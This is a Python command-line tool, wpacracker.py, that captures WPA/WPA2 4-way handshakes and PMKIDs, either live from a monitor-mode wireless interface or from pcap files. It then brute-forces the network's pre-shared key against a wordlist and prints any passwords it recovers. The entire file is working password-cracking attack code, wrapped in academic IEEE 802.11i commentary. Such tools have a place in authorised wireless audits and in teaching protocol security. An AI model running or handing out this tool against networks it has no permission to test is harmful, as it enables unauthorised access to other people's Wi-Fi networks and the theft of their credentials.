#!/usr/bin/env python3
"""
wpacracker.py — WPA/WPA2 handshake capture and PSK cracking.
Standards-focused. IEEE 802.11 terminology in comments. Academic but practical.
"""

import argparse
import hashlib
import hmac as hmac_mod
import os
import sys
import time
from collections import defaultdict
from dataclasses import dataclass, field
from typing import Dict, List, Optional, Set, Tuple

# Maximum wordlist size (CWE-770)
MAX_WORDLIST_SIZE = 500 * 1024 * 1024  # 500MB
MAX_PCAP_SIZE = 1 * 1024 * 1024 * 1024  # 1GB


def _validate_path(path: str, purpose: str = "input") -> str:
    """Validate a file path — canonicalize and check exists (CWE-20/CWE-22)."""
    resolved = os.path.realpath(path)
    if purpose == "input" and not os.path.isfile(resolved):
        raise FileNotFoundError(f"File not found: {resolved}")
    if purpose == "input":
        size = os.path.getsize(resolved)
        if size > MAX_WORDLIST_SIZE:
            raise ValueError(f"File too large ({size} bytes > {MAX_WORDLIST_SIZE} max)")
    if purpose == "output":
        parent = os.path.dirname(resolved)
        if parent and not os.path.isdir(parent):
            raise FileNotFoundError(f"Output directory does not exist: {parent}")
    return resolved

# ---------------------------------------------------------------------------
# IEEE 802.11i constants
# ---------------------------------------------------------------------------

EAPOL_ETHERTYPE = 0x888E  # IEEE 802.1X — EAP over LAN
RSN_KEY_DESCRIPTOR_TYPE = 2  # RSN (Robust Security Network) key descriptor
PBKDF2_ITERATIONS = 4096  # Per IEEE 802.11i-2004 Section 8.5.1.1
PMK_BIT_LEN = 256  # 256-bit PMK
PTK_BIT_LEN = 384  # 384-bit PTK for CCMP (AES)

# EAPOL-Key frame flags
PMKID_FLAG = 0x08  # Bit 4: PMKID present in message 1


# ---------------------------------------------------------------------------
# Data structures
# ---------------------------------------------------------------------------

@dataclass
class EAPOLKeyFrame:
    """Represents an EAPOL-Key frame per IEEE 802.11-2012 Section 11.6.1."""
    version: int = 0
    descriptor_type: int = 0
    key_info: int = 0
    key_len: int = 0
    replay_counter: int = 0
    nonce: bytes = b""
    iv: bytes = b""
    rsc: bytes = b""
    key_id: bytes = b""
    mic: bytes = b""
    key_data_len: int = 0
    key_data: bytes = b""

    @property
    def key_type(self) -> int:
        """Bit 3 of Key Info: 0=Group, 1=Pairwise"""
        return (self.key_info >> 3) & 1

    @property
    def key_ack(self) -> int:
        """Bit 7 of Key Info"""
        return (self.key_info >> 7) & 1

    @property
    def key_mic(self) -> int:
        """Bit 8 of Key Info"""
        return (self.key_info >> 8) & 1

    @property
    def secure(self) -> int:
        """Bit 9 of Key Info"""
        return (self.key_info >> 9) & 1

    @property
    def has_pmkid(self) -> bool:
        return bool(self.key_info & PMKID_FLAG)

    @property
    def msg_num(self) -> int:
        """Determine message number based on key_info flags."""
        pairwise = self.key_type == 1
        ack = self.key_ack
        mic = self.key_mic
        secure = self.secure

        if pairwise and ack and not mic and not secure:
            return 1
        if pairwise and not ack and mic and not secure:
            return 2
        if pairwise and ack and mic and secure:
            return 3
        if pairwise and not ack and mic and secure:
            return 4
        return 0


@dataclass
class Handshake:
    """Captured 4-way handshake for one (BSSID, STA) pair."""
    bssid: str = ""
    sta: str = ""
    essid: str = ""
    anonce: bytes = b""
    snonce: bytes = b""
    mic: bytes = b""
    eapol_frame: bytes = b""  # Raw EAPOL frame from message 2 (for MIC verification)
    messages: List[int] = field(default_factory=list)
    pmkid: Optional[bytes] = None
    complete: bool = False

    def add_message(self, msg: EAPOLKeyFrame, raw_frame: bytes, msg_num: int):
        if msg_num in self.messages:
            return
        self.messages.append(msg_num)
        if msg_num == 1:
            self.anonce = msg.nonce
            if msg.has_pmkid and len(msg.key_data) >= 20:
                # PMKID is first 16 bytes of key data
                self.pmkid = msg.key_data[:16]
        elif msg_num == 2:
            self.snonce = msg.nonce
            self.mic = msg.mic
            self.eapol_frame = raw_frame


# ---------------------------------------------------------------------------
# EAPOL parsing — IEEE 802.1X-2010 Section 11.3
# ---------------------------------------------------------------------------

def parse_eapol_key(frame: bytes) -> Optional[EAPOLKeyFrame]:
    """Parse an EAPOL-Key frame from raw 802.11 data."""
    if len(frame) < 95:  # Minimum EAPOL-Key frame size
        return None

    try:
        ek = EAPOLKeyFrame()
        ek.version = frame[0]
        ek.descriptor_type = frame[1]

        if ek.descriptor_type != RSN_KEY_DESCRIPTOR_TYPE:
            return None

        ek.key_info = (frame[2] << 8) | frame[3]
        ek.key_len = (frame[4] << 8) | frame[5]
        ek.replay_counter = int.from_bytes(frame[6:14], byteorder='big')
        ek.nonce = frame[14:46]
        ek.iv = frame[46:62]
        ek.rsc = frame[62:70]
        ek.key_id = frame[70:78]
        ek.mic = frame[78:94]
        ek.key_data_len = (frame[94] << 8) | frame[95]

        if len(frame) > 96:
            ek.key_data = frame[96:96 + ek.key_data_len]

        return ek
    except (IndexError, ValueError):
        return None


def extract_eapol_from_packet(pkt) -> Optional[bytes]:
    """Extract EAPOL frame from a scapy packet."""
    try:
        if hasattr(pkt, 'payload'):
            raw = bytes(pkt)
            # Find EAPOL EtherType (0x888E)
            for i in range(len(raw) - 2):
                if raw[i] == 0x88 and raw[i + 1] == 0x8E:
                    # Skip LLC/SNAP header if present
                    offset = i + 2
                    return raw[offset:]
    except (IndexError, ValueError, AttributeError, TypeError):  # CWE-703: skip unparseable packets
        pass
    return None


# ---------------------------------------------------------------------------
# PBKDF2-HMAC-SHA1 — PMK derivation per IEEE 802.11i Section 8.5.1.1
# ---------------------------------------------------------------------------

def _pbkdf2_hmac_sha1(password: str, ssid: str, iterations: int = PBKDF2_ITERATIONS, dklen: int = 32) -> bytes:
    """Derive PMK from PSK and SSID using PBKDF2-HMAC-SHA1."""
    return hashlib.pbkdf2_hmac('sha1', password.encode(), ssid.encode(), iterations, dklen)


# ---------------------------------------------------------------------------
# PRF-384 — PTK derivation per IEEE 802.11-2012 Section 11.6.1.2
# ---------------------------------------------------------------------------

def _prf_384(key: bytes, prefix: str, data: bytes) -> bytes:
    """PRF-384: NIST SP 800-108 counter-mode PRF with HMAC-SHA1.
    
    Produces 384 bits (48 bytes) for PTK derivation.
    """
    result = b""
    i = 0
    # CWE-835: add iteration limit to prevent infinite loop
    MAX_ITER = 1000
    while len(result) < 48:
        i += 1
        if i > MAX_ITER:
            raise RuntimeError("PRF-384 iteration exceeded max")
        h = hmac_mod.new(key, digestmod=hashlib.sha1)
        h.update(str(i).encode())
        h.update(b"\x00")
        h.update(prefix.encode())
        h.update(b"\x00")
        h.update(data)
        result += h.digest()
    return result[:48]


def derive_ptk(pmk: bytes, anonce: bytes, snonce: bytes,
               ap_mac: bytes, sta_mac: bytes) -> bytes:
    """Derive PTK per IEEE 802.11i Section 8.5.1.2.
    
    PTK = PRF-384(PMK, "Pairwise key expansion",
                  min(AP_MAC, STA_MAC) || max(AP_MAC, STA_MAC) ||
                  min(ANonce, SNonce) || max(ANonce, SNonce))
    """
    mac1 = min(ap_mac, sta_mac)
    mac2 = max(ap_mac, sta_mac)
    nonce1 = min(anonce, snonce)
    nonce2 = max(anonce, snonce)
    data = mac1 + mac2 + nonce1 + nonce2
    return _prf_384(pmk, "Pairwise key expansion", data)


# ---------------------------------------------------------------------------
# MIC verification per IEEE 802.11-2012 Section 11.6.2
# ---------------------------------------------------------------------------

def verify_mic(ptk: bytes, eapol_frame: bytes, mic_to_check: bytes) -> bool:
    """Verify the MIC in an EAPOL-Key frame.
    
    The MIC covers the EAPOL-Key frame from version through key data,
    with the MIC field set to zero during computation.
    
    EAPOL-Key frame layout (IEEE 802.11-2012):
    Bytes 78-93 = Key MIC (16 bytes)
    """
    if len(eapol_frame) < 95:
        return False

    # Zero out MIC field (bytes 78-93 in the EAPOL key frame)
    modified = bytearray(eapol_frame)
    for j in range(78, 94):
        modified[j] = 0

    # The Key Confirmation Key (KCK) is the first 128 bits of PTK
    kck = ptk[:16]

    computed = hmac_mod.new(kck, bytes(modified), hashlib.sha1).digest()[:16]
    return computed == mic_to_check


# ---------------------------------------------------------------------------
# PMKID calculation per IEEE 802.11-2012 Section 11.6.1.3
# ---------------------------------------------------------------------------

def compute_pmkid(pmk: bytes, ap_mac: bytes, sta_mac: bytes) -> bytes:
    """PMKID = HMAC-SHA1(PMK, "PMK Name" || AP_MAC || STA_MAC)[0:16]"""
    data = b"PMK Name" + ap_mac + sta_mac
    return hmac_mod.new(pmk, data, hashlib.sha1).digest()[:16]


# ---------------------------------------------------------------------------
# Handshake detector
# ---------------------------------------------------------------------------

def hex_mac(b: bytes) -> str:
    return ":".join(f"{x:02x}" for x in b).upper()


class HandshakeDetector:
    """Detects and collects 4-way handshakes from 802.11 frames."""

    def __init__(self):
        self.handshakes: Dict[Tuple[str, str], Handshake] = defaultdict(Handshake)

    def process_frame(self, pkt) -> Optional[Tuple[str, Handshake]]:
        """Process a single 802.11 frame. Returns (bssid, handshake) if new handshake found."""
        try:
            raw = extract_eapol_from_packet(pkt)
            if raw is None:
                return None

            ek = parse_eapol_key(raw)
            if ek is None or ek.descriptor_type != RSN_KEY_DESCRIPTOR_TYPE:
                return None

            # Extract MACs from the 802.11 header
            dot11 = pkt
            if not hasattr(dot11, 'addr1') or not hasattr(dot11, 'addr2') or not hasattr(dot11, 'addr3'):
                return None

            addr1 = dot11.addr1  # Receiver
            addr2 = dot11.addr2  # Transmitter
            addr3 = dot11.addr3  # BSSID

            bssid = hex_mac(bytes(addr3))
            sta = hex_mac(bytes(addr2))

            msg_num = ek.msg_num
            if msg_num == 0:
                return None

            key = (bssid, sta)
            hs = self.handshakes[key]
            hs.bssid = bssid
            hs.sta = sta

            # Try to get ESSID from beacon/probe response
            if not hs.essid:
                if hasattr(dot11, 'info'):
                    try:
                        hs.essid = dot11.info.decode('utf-8', errors='replace')
                    except (UnicodeDecodeError, AttributeError):  # CWE-703: skip unparseable ESSID
                        pass

            hs.add_message(ek, raw, msg_num)

            # Check if handshake is complete
            if sorted(hs.messages) == [1, 2, 3, 4]:
                hs.complete = True
                return (bssid, hs)

            return None

        except (IndexError, ValueError, AttributeError, TypeError):  # CWE-703: skip malformed frames
            return None

    def get_complete_handshakes(self) -> List[Handshake]:
        return [h for h in self.handshakes.values() if h.complete]


# ---------------------------------------------------------------------------
# Cracking engine
# ---------------------------------------------------------------------------

class CrackResult:
    def __init__(self):
        self.found: Dict[str, str] = {}  # bssid -> psk

    def add(self, bssid: str, essid: str, psk: str):
        self.found[bssid] = psk

    def has(self, bssid: str) -> bool:
        return bssid in self.found


def crack_pmkid(handshake: Handshake, pmk: bytes) -> bool:
    """Verify PMK against PMKID from message 1."""
    if not handshake.pmkid:
        return False
    ap_mac = bytes.fromhex(handshake.bssid.replace(":", ""))
    sta_mac = bytes.fromhex(handshake.sta.replace(":", ""))
    computed = compute_pmkid(pmk, ap_mac, sta_mac)
    return computed == handshake.pmkid


def crack_handshake(handshake: Handshake, pmk: bytes) -> bool:
    """Verify PMK against full 4-way handshake MIC."""
    if not handshake.eapol_frame or not handshake.mic:
        return False
    ap_mac = bytes.fromhex(handshake.bssid.replace(":", ""))
    sta_mac = bytes.fromhex(handshake.sta.replace(":", ""))
    ptk = derive_ptk(pmk, handshake.anonce, handshake.snonce, ap_mac, sta_mac)
    return verify_mic(ptk, handshake.eapol_frame, handshake.mic)


def crack_wordlist(handshakes: List[Handshake], wordlist_path: str,
                   progress_cb=None) -> CrackResult:
    """Try each password in wordlist against all handshakes."""
    result = CrackResult()

    if not os.path.isfile(wordlist_path):
        print(f"[-] Wordlist not found: {wordlist_path}")
        return result

    # CWE-20/CWE-22: Validate wordlist path
    validated_path = _validate_path(wordlist_path)

    # Pre-compute per-handshake data
    handshake_data = []
    for hs in handshakes:
        if hs.bssid in result.found:
            continue
        if hs.complete or hs.pmkid:
            handshake_data.append(hs)

    # CWE-770: Count lines in single pass during main loop
    if progress_cb:
        total_lines = 0
        with open(validated_path, "r", errors="ignore") as f:
            for _ in f:
                total_lines += 1
    else:
        total_lines = 0
    count = 0

    with open(validated_path, "r", errors="ignore") as f:
        for line in f:
            psk = line.strip()
            if not psk or psk.startswith("#"):
                count += 1
                continue

            for hs in handshake_data:
                if hs.bssid in result.found:
                    continue

                pmk = _pbkdf2_hmac_sha1(psk, hs.essid or "")

                # Try PMKID first (faster, only needs 1 EAPOL frame)
                if hs.pmkid and crack_pmkid(hs, pmk):
                    result.add(hs.bssid, hs.essid or "?", psk)
                    continue

                # Try full handshake
                if hs.complete and crack_handshake(hs, pmk):
                    result.add(hs.bssid, hs.essid or "?", psk)

            count += 1
            if progress_cb:
                progress_cb(count, total_lines, len(result.found))

    return result


# ---------------------------------------------------------------------------
# Live capture
# ---------------------------------------------------------------------------

def live_capture(interface: str, timeout: int = 60, bssid_filter: str = "",
                 essid_filter: str = "") -> List[Handshake]:
    """Capture 802.11 frames from monitor mode interface."""
    print(f"[*] Starting capture on {interface} (timeout={timeout}s)")
    print("[*] Press Ctrl+C to stop early")

    try:
        from scapy.all import sniff
    except ImportError:
        print("scapy not installed. Try: pip install scapy")
        sys.exit(1)

    detector = HandshakeDetector()
    start = time.time()

    def handle_pkt(pkt):
        if bssid_filter and hasattr(pkt, 'addr3'):
            if hex_mac(bytes(pkt.addr3)) != bssid_filter.upper():
                return
        det = detector.process_frame(pkt)
        if det:
            bssid, hs = det
            print(f"[!] Complete 4-way handshake: {hs.bssid} -> {hs.sta} (ESSID: {hs.essid})")

    try:
        sniff(iface=interface, prn=handle_pkt, timeout=timeout, store=0)
    except KeyboardInterrupt:
        print("\n[!] Capture stopped by user")
    except Exception as e:
        print(f"[-] Capture error: {e}")

    handshakes = detector.get_complete_handshakes()
    print(f"[*] Capture complete. Found {len(handshakes)} handshake(s)")
    return handshakes


# ---------------------------------------------------------------------------
# Pcap analysis
# ---------------------------------------------------------------------------

def analyze_pcap(pcap_path: str, bssid_filter: str = "",
                 essid_filter: str = "") -> List[Handshake]:
    """Analyze a pcap file for handshakes."""
    print(f"[*] Analyzing {pcap_path}")

    # CWE-20/CWE-22: Validate pcap path
    resolved_path = _validate_path(pcap_path)
    size = os.path.getsize(resolved_path)
    if size > MAX_PCAP_SIZE:
        print(f"[-] Pcap file too large ({size} bytes > {MAX_PCAP_SIZE} max)")
        return []

    try:
        from scapy.all import rdpcap
    except ImportError:
        print("scapy not installed. Try: pip install scapy")
        sys.exit(1)

    # CWE-404: use context manager for file
    try:
        packets = rdpcap(resolved_path)
    except Exception as e:
        print(f"[-] Failed to read pcap: {e}")
        return []

    detector = HandshakeDetector()
    for pkt in packets:
        if bssid_filter and hasattr(pkt, 'addr3'):
            if hex_mac(bytes(pkt.addr3)) != bssid_filter.upper():
                continue
        det = detector.process_frame(pkt)
        if det:
            bssid, hs = det
            print(f"[!] Found handshake: {hs.bssid} -> {hs.sta} (ESSID: {hs.essid})")

    handshakes = detector.get_complete_handshakes()
    print(f"[*] Found {len(handshakes)} complete handshake(s)")
    return handshakes


# ---------------------------------------------------------------------------
# CLI
# ---------------------------------------------------------------------------

def build_parser():
    p = argparse.ArgumentParser(prog="wpacracker", description="WPA/WPA2 handshake capture and PSK cracker")
    p.add_argument("-i", "--interface", help="Monitor mode interface for live capture")
    p.add_argument("-r", "--read", help="Read pcap file for analysis")
    p.add_argument("-w", "--wordlist", required=True, help="Password wordlist")
    p.add_argument("-o", "--output", help="Output results file")
    p.add_argument("--timeout", type=int, default=60, help="Capture timeout (s)")
    p.add_argument("--pmkid-only", action="store_true", help="Only attempt PMKID attack")
    p.add_argument("--bssid", help="Filter by BSSID")
    p.add_argument("--essid", help="Filter by ESSID")
    return p


def main():
    parser = build_parser()
    args = parser.parse_args()

    if not args.interface and not args.read:
        print("[-] Provide -i (live capture) or -r (pcap file)")
        sys.exit(1)
    if not args.wordlist:
        print("[-] Provide -w <wordlist>")
        sys.exit(1)

    # CWE-20/CWE-22: Validate wordlist path early
    _validate_path(args.wordlist)

    handshakes = []

    if args.interface:
        handshakes = live_capture(args.interface, args.timeout, args.bssid or "", args.essid or "")
    elif args.read:
        handshakes = analyze_pcap(args.read, args.bssid or "", args.essid or "")

    if not handshakes:
        print("[-] No complete handshakes found")
        # FIXME: PMKID-only handshakes might not be "complete" — check separately
        sys.exit(1)

    # Filter by ESSID if specified
    if args.essid:
        handshakes = [h for h in handshakes if h.essid == args.essid]
        if not handshakes:
            print(f"[-] No handshakes matching ESSID '{args.essid}'")
            sys.exit(1)

    print(f"[*] Cracking {len(handshakes)} handshake(s) with {args.wordlist}")

    def progress(count, total, found):
        if total > 0 and count % 1000 == 0:
            pct = count * 100 // total
            print(f"\r[*] {count}/{total} ({pct}%) — {found} found", end="", flush=True)

    result = crack_wordlist(handshakes, args.wordlist, progress)
    print()

    # Output results
    lines = []
    lines.append("WPA-Cracker Results")
    lines.append("=" * 60)
    lines.append(f"{'BSSID':20s}  {'ESSID':20s}  {'PSK':30s}  {'Status':10s}")
    lines.append("-" * 80)

    for hs in handshakes:
        bssid = hs.bssid
        essid = hs.essid or "?"
        if result.has(bssid):
            psk = result.found[bssid]
            lines.append(f"{bssid:20s}  {essid:20s}  {psk:30s}  {'FOUND':10s}")
        else:
            lines.append(f"{bssid:20s}  {essid:20s}  {'[not in list]':30s}  {'NOT FOUND':10s}")

    output = "\n".join(lines)
    print("\n" + output)

    if args.output:
        # CWE-20/CWE-22: Validate output path
        out_path = _validate_path(args.output, "output")
        with open(out_path, "w") as f:
            f.write(output + "\n")
        print(f"\n[+] Results saved to {args.output}")

    if not any(result.has(h.bssid) for h in handshakes):
        print("[-] No PSK found. Try a larger wordlist.")


if __name__ == "__main__":
    main()
